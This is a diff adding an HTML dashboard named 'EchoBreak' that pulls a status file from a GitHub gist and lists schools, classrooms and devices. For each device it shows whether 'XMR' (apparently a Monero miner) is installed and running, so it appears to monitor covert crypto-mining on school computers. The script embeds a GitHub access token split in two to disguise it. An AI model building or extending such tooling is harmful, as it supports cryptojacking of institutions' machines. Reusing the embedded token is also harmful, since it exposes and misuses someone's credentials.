@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>EchoBreak - Status</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <div class="dashboard-container">
+    <h1>EchoBreak</h1>
+    <h2>Device Status Dashboard</h2>
+    <div id="dashboard"></div>
+  </div>
+
+  <script>
+    const token = 'ghp_iFEyATUgNTdKWnja' + '0PorXZQUKu2u8P4EPxhI';
+    const filename = "status.json";
+    const gist_id = "f115340ff9260344597ae98580b36e15";
+
+    async function fetchGist() {
+      const url = `https://api.github.com/gists/ ${gist_id}`;
+      
+      const response = await fetch(url, {
+        method: 'GET',
+        headers: {
+          'Authorization': `token ${token}`,
+          'Accept': 'application/vnd.github.v3+json'
+        }
+      });
+
+      const gist = await response.json();
+      const file = gist.files[filename];
+      if (!file) {
+        console.error("File not found in Gist");
+        return;
+      }
+
+      const raw_url = file.raw_url;
+      const jsonRes = await fetch(raw_url);
+      const data = await jsonRes.json();
+      renderDashboard(data);
+    }
+
+    function renderDashboard(data) {
+      const dashboard = document.getElementById('dashboard');
+
+      for (const school in data.schools) {
+        const schoolDiv = document.createElement('div');
+        schoolDiv.className = 'school';
+        schoolDiv.innerHTML = `<h2>مدرسة ${school}</h2>`;
+        
+        const rooms = data.schools[school];
+        for (const room in rooms) {
+          const roomDiv = document.createElement('div');
+          roomDiv.className = 'room';
+          roomDiv.innerHTML = `<h3>فصل ${room}</h3>`;
+          
+          const devices = rooms[room];
+          for (const type in devices) {
+            const deviceTypeDiv = document.createElement('div');
+            deviceTypeDiv.className = 'device-container';
+            deviceTypeDiv.innerHTML = `<h4>${type}</h4>`;
+
+            for (const name in devices[type]) {
+              const device = devices[type][name];
+              const div = document.createElement('div');
+              div.className = `device ${device.online ? 'online' : ''}`;
+              div.innerHTML = `
+                <div class="device-name">${name}</div>
+                <div class="details">
+                  XMR Installed: ${device['xmr-installed']}<br>
+                  XMR Running: ${device['xmr-running']}<br>
+                  Online: ${device.online}
+                </div>
+              `;
+              div.addEventListener('click', () => {
+                div.classList.toggle('expanded');
+              });
+              deviceTypeDiv.appendChild(div);
+            }
+
+            roomDiv.appendChild(deviceTypeDiv);
+          }
+
+          schoolDiv.appendChild(roomDiv);
+        }
+
+        dashboard.appendChild(schoolDiv);
+      }
+    }
+
+    fetchGist();
+  </script>
+</body>
+</html>
